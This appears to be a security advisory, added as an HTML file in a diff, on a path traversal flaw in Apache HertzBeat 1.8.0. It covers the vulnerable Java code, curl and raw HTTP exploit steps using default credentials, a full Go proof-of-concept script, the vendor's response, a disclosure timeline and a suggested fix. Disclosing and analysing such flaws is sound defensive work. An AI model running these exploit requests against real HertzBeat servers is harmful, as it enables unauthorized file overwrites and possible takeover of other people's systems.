@@ -1,0 +1,671 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Apache HertzBeat (v1.8.0) Path Traversal Leading to RCE</title>
+  <style>
+    body {
+      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', Arial, sans-serif;
+      line-height: 1.6;
+      max-width: 900px;
+      margin: 0 auto;
+      padding: 2rem;
+      color: #333;
+    }
+    h1 { font-size: 1.75rem; margin-top: 0; border-bottom: 2px solid #333; padding-bottom: 0.5rem; }
+    h2 { font-size: 1.35rem; margin-top: 2rem; }
+    h3 { font-size: 1.15rem; margin-top: 1.5rem; }
+    h4 { font-size: 1.05rem; margin-top: 1.25rem; }
+    pre, code {
+      font-family: 'SF Mono', Monaco, 'Consolas', 'Liberation Mono', monospace;
+      font-size: 0.9rem;
+    }
+    pre {
+      background: #f5f5f5;
+      border: 1px solid #ddd;
+      border-radius: 4px;
+      padding: 1rem;
+      overflow-x: auto;
+      white-space: pre;
+      margin: 1rem 0;
+    }
+    code { padding: 0.2em 0.4em; background: #f0f0f0; border-radius: 3px; }
+    pre code { padding: 0; background: none; }
+    blockquote {
+      margin: 1rem 0;
+      padding: 1rem 1.5rem;
+      background: #f9f9f9;
+      border-left: 4px solid #666;
+      font-style: italic;
+    }
+    a { color: #0066cc; text-decoration: none; }
+    a:hover { text-decoration: underline; }
+    hr { margin: 2rem 0; border: none; border-top: 1px solid #ccc; }
+    ul { margin: 0.5rem 0; padding-left: 1.5rem; }
+  </style>
+</head>
+<body>
+
+<h1>Apache HertzBeat (v1.8.0) Path Traversal Leading to RCE</h1>
+
+<p><strong>Severity:</strong> HIGH<br>
+<strong>CWE:</strong> CWE-22 (Improper Limitation of a Pathname to a Restricted Directory)<br>
+<strong>Product:</strong> <a href="https://hertzbeat.apache.org/">https://hertzbeat.apache.org/</a> (v1.8.0)<br>
+<strong>Affected Component:</strong> <code>AppServiceImpl.LocalFileAppDefineStoreImpl</code><br>
+<strong>Affected Endpoints:</strong><br>
+&nbsp;&nbsp;&nbsp;&nbsp;- <code>GET /api/apps/{app}/define/yml</code> (read)<br>
+&nbsp;&nbsp;&nbsp;&nbsp;- <code>POST /api/apps/define/yml</code> (write)<br>
+&nbsp;&nbsp;&nbsp;&nbsp;- <code>PUT /api/apps/define/yml</code> (write/overwrite)<br>
+&nbsp;&nbsp;&nbsp;&nbsp;- <code>DELETE /api/apps/{app}/define/yml</code> (delete)<br>
+<strong>Auth Required:</strong> admin or standard user role (standard user can exploit; admin needed for cleanup)<br>
+&nbsp;&nbsp;&nbsp;&nbsp;- Default credentials in <code>sureness.yml</code>: <code>admin</code> / <code>hertzbeat</code></p>
+
+<p><strong>Author:</strong> Brett Gervasoni<br>
+<strong>Date:</strong> 2026-03-09</p>
+
+<hr>
+
+<h2>Vulnerability Summary</h2>
+
+<p>The <code>app</code> parameter is used directly in file path construction with <strong>zero sanitization</strong> for path traversal characters (<code>../</code>). An authenticated attacker can read, write, or delete arbitrary <code>.yml</code> files anywhere on the filesystem.</p>
+
+<p>The included exploit code automates the proof of concept in Docker, automating the multi-step exploitation process. Manual steps are also documented below.</p>
+
+<p>This vulnerability can lead to RCE.</p>
+
+<hr>
+
+<h2>Vulnerable Code</h2>
+
+<p><strong><code>AppServiceImpl.java</code> lines 661-664</strong> — <code>loadAppDefine()</code> (read path):</p>
+
+<pre><code>public String loadAppDefine(String app) {
+    var classpath = Objects.requireNonNull(this.getClass().getClassLoader().getResource("")).getPath();
+    var defineAppPath = classpath + "define" + File.separator + "app-" + app + ".yml";
+    var defineAppFile = new File(defineAppPath);
+    if (defineAppFile.exists() &amp;&amp; defineAppFile.isFile()) {
+        return FileUtils.readFileToString(defineAppFile, StandardCharsets.UTF_8);
+    }
+    return null;
+}</code></pre>
+
+<p><strong><code>AppServiceImpl.java</code> line 679</strong> — <code>save()</code> (write path):</p>
+
+<pre><code>public void save(String app, String ymlContent) {
+    var classpath = Objects.requireNonNull(this.getClass().getClassLoader().getResource("")).getPath();
+    var defineAppPath = classpath + "define" + File.separator + "app-" + app + ".yml";
+    var defineAppFile = new File(defineAppPath);
+    FileUtils.writeStringToFile(defineAppFile, ymlContent, StandardCharsets.UTF_8, false);
+}</code></pre>
+
+<p><strong><code>AppServiceImpl.java</code> line 692</strong> — <code>delete()</code> (delete path):</p>
+
+<pre><code>public void delete(String app) {
+    var classpath = Objects.requireNonNull(this.getClass().getClassLoader().getResource("")).getPath();
+    var defineAppPath = classpath + "define" + File.separator + "app-" + app + ".yml";
+    var defineAppFile = new File(defineAppPath);
+    if (defineAppFile.exists() &amp;&amp; defineAppFile.isFile()) {
+        defineAppFile.delete();
+    }
+}</code></pre>
+
+<p>The controller passes the value through with no validation:</p>
+
+<p><strong><code>AppController.java</code> lines 100-101</strong> (GET):</p>
+
+<pre><code>@GetMapping(path = "/{app}/define/yml")
+public ResponseEntity&lt;Message&lt;String&gt;&gt; queryAppDefineYml(
+        @PathVariable("app") final String app) {
+    return ResponseUtil.handle(() -&gt; appService.getMonitorDefineFileContent(app));
+}</code></pre>
+
+<p><strong><code>AppController.java</code> lines 111-121</strong> (POST — <code>app</code> extracted from YAML body):</p>
+
+<pre><code>@PostMapping(path = "/define/yml")
+public ResponseEntity&lt;Message&lt;Void&gt;&gt; newAppDefineYml(@Valid @RequestBody MonitorDefineDto defineDto) {
+    return ResponseUtil.handle(() -&gt; {
+        // ...risky token check (does NOT check for ../)...
+        appService.applyMonitorDefineYml(defineDto.getDefine(), false);
+    });
+}</code></pre>
+
+<p>In <code>applyMonitorDefineYml()</code>, the <code>app</code> name comes from the YAML body itself:</p>
+
+<pre><code>Job app = yaml.loadAs(ymlContent, Job.class);
+appDefineStore.save(app.getApp(), ymlContent);  // app.getApp() is attacker-controlled</code></pre>
+
+<hr>
+
+<h2>Authentication Requirements</h2>
+
+<p>From <code>sureness.yml</code>:</p>
+<ul>
+  <li><strong>GET</strong> <code>/api/apps/**</code> requires role: <code>[admin, user]</code> (any authenticated user)</li>
+  <li><strong>POST/PUT</strong> to <code>/api/apps/define/yml</code> — not explicitly listed in sureness RBAC config; behavior falls through with Sureness</li>
+  <li><strong>DELETE</strong> <code>/api/apps/**</code> requires role: <code>[admin]</code></li>
+</ul>
+
+<p>A standard user is able to exploit this vulnerability. They are not able to successfully clean up (e.g., switch storage back) without admin privileges.</p>
+
+<hr>
+
+<h2>Constraints</h2>
+
+<ul>
+  <li><strong>.yml extension always appended</strong> — Can only target files ending in <code>.yml</code>. For example, <code>/etc/passwd</code> is NOT reachable</li>
+  <li><strong>app- prefix prepended to filename</strong> — First path component becomes <code>app-&lt;input&gt;</code>, blocking naive <code>../../</code> traversal</li>
+  <li><strong>app- prefix bypass</strong> — Inject <code>/</code> to make <code>app-&lt;x&gt;</code> a directory, then <code>../..</code> to escape (two-step attack via POST/PUT)</li>
+  <li><strong>@PathVariable in GET/DELETE URL</strong> — <strong>Not exploitable.</strong> Tomcat blocks <code>%2F</code>, semicolons are stripped as matrix params, and literal <code>../</code> is normalized before reaching the controller. This may differ with other configurations, but this was how it acted when tested using the default Docker container.</li>
+  <li><strong>POST/PUT YAML body</strong> — <strong>Exploitable.</strong> <code>app</code> field comes from parsed YAML body — can contain arbitrary characters including <code>/</code>.</li>
+</ul>
+
+<hr>
+
+<h2>Exploit Scenarios</h2>
+
+<p>RCE avenues for this vulnerability exist (outside of the Script Collection bug):</p>
+<ul>
+  <li>Overwrite configuration <code>.yml</code> files (e.g., <code>application.yml</code>, <code>sureness.yml</code>)</li>
+  <li>Write malicious <code>.yml</code> files to arbitrary locations on disk</li>
+  <li>Potential privilege escalation by overwriting <code>sureness.yml</code> with attacker-controlled accounts</li>
+</ul>
+
+<hr>
+
+<h2>Proof of Concept</h2>
+
+<p>See <code>poc_path_traversal.go</code> for the automated exploit script.</p>
+
+<h3>Prerequisites</h3>
+
+<p>The default HertzBeat deployment uses <code>DatabaseAppDefineStoreImpl</code>, which stores definitions in the database (no filesystem writes). The vulnerable <code>LocalFileAppDefineStoreImpl</code> is activated when the object store type is set to <code>FILE</code>. An admin can switch this via the config API (Step 2 below).</p>
+
+<p>Classpath layout inside the Docker container (<code>apache/hertzbeat</code>):</p>
+
+<pre><code>/opt/hertzbeat/
+├── config/
+│   ├── application.yml      ← database credentials, Spring config
+│   ├── sureness.yml          ← admin credentials in plaintext
+│   └── logback-spring.xml
+├── define/
+│   ├── app-api.yml           ← monitoring type definitions
+│   ├── app-mysql.yml
+│   └── ...
+└── apache-hertzbeat-1.8.0.jar</code></pre>
+
+<h3>Step 1 — Authenticate (obtain JWT token)</h3>
+
+<p><strong>curl:</strong></p>
+
+<pre><code>TOKEN=$(curl -s -X POST http://TARGET:1157/api/account/auth/form \
+  -H 'Content-Type: application/json' \
+  -d '{"type":1,"identifier":"admin","credential":"hertzbeat"}' \
+  | python3 -c "import sys,json; print(json.load(sys.stdin)['data']['token'])")
+echo "Token: $TOKEN"</code></pre>
+
+<p><strong>Raw HTTP Request:</strong></p>
+
+<pre><code>POST /api/account/auth/form HTTP/1.1
+Host: TARGET:1157
+Content-Type: application/json
+Content-Length: 65
+
+{"type":1,"identifier":"admin","credential":"hertzbeat"}</code></pre>
+
+<hr>
+
+<h3>Step 2 — Switch object store to FILE mode</h3>
+
+<p>The default store is <code>DatabaseAppDefineStoreImpl</code> (saves to DB, no filesystem writes). To activate the vulnerable <code>LocalFileAppDefineStoreImpl</code>, switch the object store type to <code>FILE</code> via the config API.</p>
+
+<p><strong>curl:</strong></p>
+
+<pre><code>curl -s -X POST http://TARGET:1157/api/config/oss \
+  -H 'Content-Type: application/json' \
+  -H "Authorization: Bearer $TOKEN" \
+  -d '{"type":"FILE"}'</code></pre>
+
+<p><strong>Raw HTTP Request:</strong></p>
+
+<pre><code>POST /api/config/oss HTTP/1.1
+Host: TARGET:1157
+Authorization: Bearer eyJhbGciOiJIUzUxMiIsInR5cCI6IkpXVCJ9...&lt;SNIPPED&gt;
+Content-Type: application/json
+Content-Length: 15
+
+{"type":"FILE"}</code></pre>
+
+<p><strong>Expected Response:</strong></p>
+
+<pre><code>HTTP/1.1 200 OK
+Content-Type: application/json
+
+{"code":0,"msg":"Update config success","data":"Update config success"}</code></pre>
+
+<hr>
+
+<h3>Step 3 — Write attack via PUT (two-step)</h3>
+
+<p>The <code>app</code> field is extracted from the YAML request body (not the URL), so there are no URL encoding restrictions. We use <code>PUT</code> (modify) rather than <code>POST</code> (create) because PUT calls <code>applyMonitorDefineYml(define, true)</code> which skips the "already exists" check, making the exploit idempotent and re-runnable.</p>
+
+<h4>Step 3a — Create the <code>app-x/</code> directory (prerequisite)</h4>
+
+<p>The <code>app-</code> prefix is always prepended to the user input, making naive <code>../../</code> traversal fail (the OS sees <code>app-..</code> as a literal directory name). To bypass this, we first create a real <code>app-x/</code> directory inside <code>define/</code> by submitting a YAML with <code>app: "x/y"</code>. Apache Commons IO's <code>FileUtils.writeStringToFile()</code> internally calls <code>mkdirs()</code> on the parent, creating the <code>app-x/</code> directory.</p>
+
+<p><strong>curl:</strong></p>
+
+<pre><code>curl -s -X PUT http://TARGET:1157/api/apps/define/yml \
+  -H 'Content-Type: application/json' \
+  -H "Authorization: Bearer $TOKEN" \
+  -d '{
+    "define": "app: x/y\ncategory: custom\nname:\n  en: PoC Stage1\n  zh-CN: PoC\nparams:\n  - field: host\n    name:\n      en: Host\n      zh-CN: Host\n    type: text\n    required: true\nmetrics:\n  - name: basic\n    priority: 0\n    fields:\n      - field: status\n        type: 1\n    protocol: http\n    http:\n      host: ^_^host^_^\n      port: 80\n      url: /\n      method: GET\n      parseType: default"
+  }'</code></pre>
+
+<p><strong>Raw HTTP Request:</strong></p>
+
+<pre><code>PUT /api/apps/define/yml HTTP/1.1
+Host: TARGET:1157
+Authorization: Bearer eyJhbGciOiJIUzUxMiIsInR5cCI6IkpXVCJ9...&lt;SNIPPED&gt;
+Content-Type: application/json
+Content-Length: 410
+
+{
+  "define": "app: x/y\ncategory: custom\nname:\n  en: PoC Stage1\n  zh-CN: PoC\nparams:\n  - field: host\n    name:\n      en: Host\n      zh-CN: Host\n    type: text\n    required: true\nmetrics:\n  - name: basic\n    priority: 0\n    fields:\n      - field: status\n        type: 1\n    protocol: http\n    http:\n      host: ^_^host^_^\n      port: 80\n      url: /\n      method: GET\n      parseType: default"
+}</code></pre>
+
+<p><strong>Decoded <code>define</code> value (the YAML that gets parsed server-side):</strong></p>
+
+<pre><code>app: x/y
+category: custom
+name:
+  en: PoC Stage1
+  zh-CN: PoC
+params:
+  - field: host
+    name:
+      en: Host
+      zh-CN: Host
+    type: text
+    required: true
+metrics:
+  - name: basic
+    priority: 0
+    fields:
+      - field: status
+        type: 1
+    protocol: http
+    http:
+      host: ^_^host^_^
+      port: 80
+      url: /
+      method: GET
+      parseType: default</code></pre>
+
+<p><strong>What happens on disk:</strong></p>
+
+<pre><code>Created:  &lt;classpath&gt;/define/app-x/         ← directory created by mkdirs()
+Written:  &lt;classpath&gt;/define/app-x/y.yml    ← file written by writeStringToFile()</code></pre>
+
+<p><strong>Expected Response:</strong></p>
+
+<pre><code>HTTP/1.1 200 OK
+Content-Type: application/json
+
+{"code":0,"msg":null,"data":null}</code></pre>
+
+<h4>Step 3b — Write a file outside <code>define/</code> via traversal</h4>
+
+<p>Now that the <code>app-x/</code> directory exists, we submit a YAML where the <code>app</code> field traverses out of <code>define/</code> through it. The target is the <code>config/</code> directory (next to <code>sureness.yml</code> and <code>application.yml</code>):</p>
+
+<pre><code>app: x/../../config/poc-traversal-proof
+→ path: /opt/hertzbeat/define/app-x/../../config/poc-traversal-proof.yml
+→ resolves to: /opt/hertzbeat/config/poc-traversal-proof.yml  (OUTSIDE define/)</code></pre>
+
+<p><strong>curl:</strong></p>
+
+<pre><code>curl -s -X PUT http://TARGET:1157/api/apps/define/yml \
+  -H 'Content-Type: application/json' \
+  -H "Authorization: Bearer $TOKEN" \
+  -d '{
+    "define": "app: x/../../config/poc-traversal-proof\ncategory: custom\nname:\n  en: PoC Traversal Proof\n  zh-CN: PoC\nparams:\n  - field: host\n    name:\n      en: Host\n      zh-CN: Host\n    type: text\n    required: true\nmetrics:\n  - name: basic\n    priority: 0\n    fields:\n      - field: status\n        type: 1\n    protocol: http\n    http:\n      host: ^_^host^_^\n      port: 80\n      url: /\n      method: GET\n      parseType: default"
+  }'</code></pre>
+
+<p><strong>Raw HTTP Request:</strong></p>
+
+<pre><code>PUT /api/apps/define/yml HTTP/1.1
+Host: TARGET:1157
+Authorization: Bearer eyJhbGciOiJIUzUxMiIsInR5cCI6IkpXVCJ9...&lt;SNIPPED&gt;
+Content-Type: application/json
+Content-Length: 462
+
+{
+  "define": "app: x/../../config/poc-traversal-proof\ncategory: custom\nname:\n  en: PoC Traversal Proof\n  zh-CN: PoC\nparams:\n  - field: host\n    name:\n      en: Host\n      zh-CN: Host\n    type: text\n    required: true\nmetrics:\n  - name: basic\n    priority: 0\n    fields:\n      - field: status\n        type: 1\n    protocol: http\n    http:\n      host: ^_^host^_^\n      port: 80\n      url: /\n      method: GET\n      parseType: default"
+}</code></pre>
+
+<p><strong>Decoded <code>define</code> value (the YAML that gets parsed server-side):</strong></p>
+
+<pre><code>app: x/../../config/poc-traversal-proof
+category: custom
+name:
+  en: PoC Traversal Proof
+  zh-CN: PoC
+params:
+  - field: host
+    name:
+      en: Host
+      zh-CN: Host
+    type: text
+    required: true
+metrics:
+  - name: basic
+    priority: 0
+    fields:
+      - field: status
+        type: 1
+    protocol: http
+    http:
+      host: ^_^host^_^
+      port: 80
+      url: /
+      method: GET
+      parseType: default</code></pre>
+
+<p><strong>What happens on disk:</strong></p>
+
+<pre><code>Intended:  /opt/hertzbeat/define/app-x/../../config/poc-traversal-proof.yml
+Resolved:  /opt/hertzbeat/config/poc-traversal-proof.yml   ← FILE WRITTEN OUTSIDE define/</code></pre>
+
+<p><strong>Expected Response:</strong></p>
+
+<pre><code>HTTP/1.1 200 OK
+Content-Type: application/json
+
+{"code":0,"msg":null,"data":null}</code></pre>
+
+<hr>
+
+<h3>Step 4 — Verify on the server</h3>
+
+<pre><code>docker exec hertzbeat ls -la /opt/hertzbeat/config/
+docker exec hertzbeat cat /opt/hertzbeat/config/poc-traversal-proof.yml</code></pre>
+
+<p><strong>Confirmed output from running the PoC:</strong></p>
+
+<pre><code>$ docker exec hertzbeat ls -la /opt/hertzbeat/config/
+total 44
+drwxr-xr-x 1 root root    4096 Feb 15 14:29 .
+drwxr-xr-x 1 root root    4096 Feb 15 14:25 ..
+-rw-r--r-- 1  501 dialout 8688 Dec 16 23:55 application.yml
+-rw-r--r-- 1  501 dialout 7949 Dec 16 23:55 logback-spring.xml
+-rw-r--r-- 1 root root     433 Feb 15 14:29 poc-traversal-proof.yml    ← WRITTEN BY PoC
+-rw-r--r-- 1  501 dialout 4735 Feb 15 10:31 sureness.yml</code></pre>
+
+<p>The file <code>poc-traversal-proof.yml</code> was written to <code>/opt/hertzbeat/config/</code>, next to <code>sureness.yml</code> and <code>application.yml</code>, confirming arbitrary <code>.yml</code> file write outside the intended <code>define/</code> directory.</p>
+
+<hr>
+
+<h2>Exploit Code</h2>
+
+<p>This targets a default instance running in Docker, using the admin user. A standard non-admin user can be used as well.</p>
+
+<p>Full source of <code>poc_path_traversal.go</code>:</p>
+
+<pre><code>package main
+
+import (
+	"bytes"
+	"encoding/json"
+	"fmt"
+	"io"
+	"net/http"
+	"os"
+	"os/exec"
+	"strings"
+)
+
+const target = "http://localhost:1157"
+
+type authResponse struct {
+	Code int `json:"code"`
+	Data struct {
+		Token string `json:"token"`
+	} `json:"data"`
+}
+
+type apiResponse struct {
+	Code int    `json:"code"`
+	Msg  string `json:"msg"`
+}
+
+func main() {
+	fmt.Println("============================================================")
+	fmt.Println(" HertzBeat Path Traversal PoC")
+	fmt.Println("============================================================\n")
+
+	// Step 1: Authenticate
+	fmt.Println("[*] Step 1 — Authenticating as admin...")
+	token, err := authenticate()
+	if err != nil {
+		fmt.Fprintf(os.Stderr, "[-] Auth failed: %v\n", err)
+		os.Exit(1)
+	}
+	fmt.Printf("[+] Got token: %s...\n\n", token[:40])
+
+	// Step 2: Switch storage to FILE mode to activate LocalFileAppDefineStoreImpl
+	fmt.Println("[*] Step 2 — Switching object store to FILE mode...")
+	fmt.Println("    POST /api/config/oss with {\"type\":\"FILE\"}")
+	fmt.Println("    This activates LocalFileAppDefineStoreImpl (filesystem-based store)")
+	err = switchToFileStore(token)
+	if err != nil {
+		fmt.Fprintf(os.Stderr, "[-] Failed to switch store: %v\n", err)
+		os.Exit(1)
+	}
+	fmt.Println("[+] Object store switched to FILE mode.\n")
+
+	// Step 3: Create app-x/ directory via PUT with app: "x/y"
+	fmt.Println("[*] Step 3 — Creating app-x/ directory inside define/...")
+	fmt.Println("    PUT /api/apps/define/yml with app: \"x/y\"")
+	fmt.Println("    FileUtils.writeStringToFile() calls mkdirs(), creating app-x/")
+	err = putDefine(token, makeJobYAML("x/y", "PoC DirSetup"))
+	if err != nil {
+		fmt.Fprintf(os.Stderr, "[-] Failed: %v\n", err)
+		os.Exit(1)
+	}
+	fmt.Println("[+] Done.\n")
+
+	// Step 4: Write file outside define/ via path traversal
+	traversalApp := "x/../../config/poc-traversal-proof"
+	fmt.Println("[*] Step 4 — Writing file OUTSIDE define/ via traversal...")
+	fmt.Printf("    app name: %q\n", traversalApp)
+	fmt.Println("    Resolved: /opt/hertzbeat/config/poc-traversal-proof.yml")
+	err = putDefine(token, makeJobYAML(traversalApp, "PoC Traversal Proof"))
+	if err != nil {
+		fmt.Fprintf(os.Stderr, "[-] Failed: %v\n", err)
+		os.Exit(1)
+	}
+	fmt.Println("[+] Write request succeeded.\n")
+
+	// Step 5: Verify via docker exec
+	fmt.Println("[*] Step 5 — Verifying file on container...")
+	verify()
+
+	// Cleanup: switch back to DATABASE mode
+	fmt.Println("\n[*] Cleanup — Switching object store back to DATABASE mode...")
+	err = switchToDatabaseStore(token)
+	if err != nil {
+		fmt.Fprintf(os.Stderr, "[!] Warning: failed to restore DATABASE mode: %v\n", err)
+	} else {
+		fmt.Println("[+] Restored DATABASE mode.")
+	}
+}
+
+func authenticate() (string, error) {
+	body := `{"type":1,"identifier":"operator","credential":"hertzbeat"}`
+	resp, err := http.Post(target+"/api/account/auth/form", "application/json", bytes.NewBufferString(body))
+	if err != nil {
+		return "", err
+	}
+	defer resp.Body.Close()
+	var result authResponse
+	if err := json.NewDecoder(resp.Body).Decode(&amp;result); err != nil {
+		return "", err
+	}
+	if result.Code != 0 || result.Data.Token == "" {
+		return "", fmt.Errorf("unexpected response code %d", result.Code)
+	}
+	return result.Data.Token, nil
+}
+
+func switchToFileStore(token string) error {
+	return postConfig(token, `{"type":"FILE"}`)
+}
+
+func switchToDatabaseStore(token string) error {
+	return postConfig(token, `{"type":"DATABASE"}`)
+}
+
+func postConfig(token, body string) error {
+	req, _ := http.NewRequest("POST", target+"/api/config/oss", bytes.NewBufferString(body))
+	req.Header.Set("Content-Type", "application/json")
+	req.Header.Set("Authorization", "Bearer "+token)
+	resp, err := http.DefaultClient.Do(req)
+	if err != nil {
+		return err
+	}
+	defer resp.Body.Close()
+	respBody, _ := io.ReadAll(resp.Body)
+	var result apiResponse
+	if err := json.Unmarshal(respBody, &amp;result); err != nil {
+		return fmt.Errorf("HTTP %d: %s", resp.StatusCode, string(respBody))
+	}
+	if result.Code != 0 {
+		return fmt.Errorf("API error (code %d): %s", result.Code, result.Msg)
+	}
+	return nil
+}
+
+func makeJobYAML(appName, label string) string {
+	return fmt.Sprintf(`app: %s
+category: custom
+name:
+  en: %s
+  zh-CN: %s
+params:
+  - field: host
+    name:
+      en: Host
+      zh-CN: Host
+    type: text
+    required: true
+metrics:
+  - name: basic
+    priority: 0
+    fields:
+      - field: status
+        type: 1
+    protocol: http
+    http:
+      host: ^_^host^_^
+      port: 80
+      url: /
+      method: GET
+      parseType: default
+`, appName, label, label)
+}
+
+func putDefine(token, yamlContent string) error {
+	return sendDefine("PUT", token, yamlContent)
+}
+
+func sendDefine(method, token, yamlContent string) error {
+	payload, _ := json.Marshal(map[string]string{"define": yamlContent})
+	req, _ := http.NewRequest(method, target+"/api/apps/define/yml", bytes.NewBuffer(payload))
+	req.Header.Set("Content-Type", "application/json")
+	req.Header.Set("Authorization", "Bearer "+token)
+	resp, err := http.DefaultClient.Do(req)
+	if err != nil {
+		return err
+	}
+	defer resp.Body.Close()
+	respBody, _ := io.ReadAll(resp.Body)
+	var result apiResponse
+	if err := json.Unmarshal(respBody, &amp;result); err != nil {
+		return fmt.Errorf("HTTP %d: %s", resp.StatusCode, string(respBody))
+	}
+	if result.Code != 0 {
+		return fmt.Errorf("API error (code %d): %s", result.Code, result.Msg)
+	}
+	return nil
+}
+
+func verify() {
+	cmds := []struct {
+		desc string
+		args []string
+	}{
+		{"Listing /opt/hertzbeat/config/", []string{"docker", "exec", "hertzbeat", "ls", "-la", "/opt/hertzbeat/config/"}},
+		{"Reading poc file", []string{"docker", "exec", "hertzbeat", "cat", "/opt/hertzbeat/config/poc-traversal-proof.yml"}},
+	}
+	for _, c := range cmds {
+		fmt.Printf("    $ %s\n", strings.Join(c.args, " "))
+		out, err := exec.Command(c.args[0], c.args[1:]...).CombinedOutput()
+		if err != nil {
+			fmt.Printf("    [!] %v\n", err)
+		}
+		for _, line := range strings.Split(strings.TrimSpace(string(out)), "\n") {
+			fmt.Printf("    %s\n", line)
+		}
+		fmt.Println()
+	}
+}</code></pre>
+
+<hr>
+
+<h2 id="response-from-apache">Response from Apache</h2>
+
+<p>Official response from Apache Security Team:</p>
+
+<blockquote>As documented in HertzBeat's security model at <a href="https://hertzbeat.apache.org/docs/help/security_model/">https://hertzbeat.apache.org/docs/help/security_model</a>, this is expected, intended functionality: it is up to the operator to make sure only trusted users are given access to HertzBeat. Customization is a feature, and users are responsible for their own custom templates. It's expected that any authenticated user is trusted with admin capabilities.</blockquote>
+
+<p>The permission model in HertzBeat has not been finished yet, though the product has shipped. See the <a href="https://hertzbeat.apache.org/docs/help/security_model/">HertzBeat Security Model</a> documentation for details.</p>
+
+<p>This is what Apache had to say about role-based permissions:</p>
+
+<blockquote>Please note that the role permission function is being improved, please do not use roles to control user permissions, all users have management permissions</blockquote>
+
+<h3>Reporting Timeline</h3>
+
+<ul>
+  <li><strong>Feb 19, 2026:</strong> Reported to Apache Security</li>
+  <li><strong>Feb 19 – March 4:</strong> Deliberations on whether or not to classify any security vulnerabilities post auth as a vulnerability.</li>
+  <li><strong>March 4:</strong> Discussion concluded. Apache does not consider post auth vulnerabilities in HertzBeat to be a vulnerability, and rather the user must accept this risk.</li>
+  <li><strong>March 9:</strong> Public release.</li>
+</ul>
+
+<hr>
+
+<h2>Unofficial Recommended Fix</h2>
+
+<p>Add input validation to reject path traversal characters in the <code>app</code> parameter. Apply this in <code>AppServiceImpl</code> or as a shared utility before any file operation:</p>
+
+<pre><code>private static final Pattern SAFE_APP_NAME = Pattern.compile("^[a-zA-Z0-9_-]+$");
+
+private void validateAppName(String app) {
+    if (app == null || !SAFE_APP_NAME.matcher(app).matches()) {
+        throw new IllegalArgumentException("Invalid app name: " + app);
+    }
+}</code></pre>
+
+<p>Additionally, use canonical path validation:</p>
+
+<pre><code>File defineAppFile = new File(defineAppPath).getCanonicalFile();
+File defineDir = new File(classpath + "define").getCanonicalFile();
+if (!defineAppFile.toPath().startsWith(defineDir.toPath())) {
+    throw new SecurityException("Path traversal detected");
+}</code></pre>
+
+<p>Both checks should be applied in <code>loadAppDefine()</code>, <code>save()</code>, and <code>delete()</code>.</p>
+
+</body>
+</html>
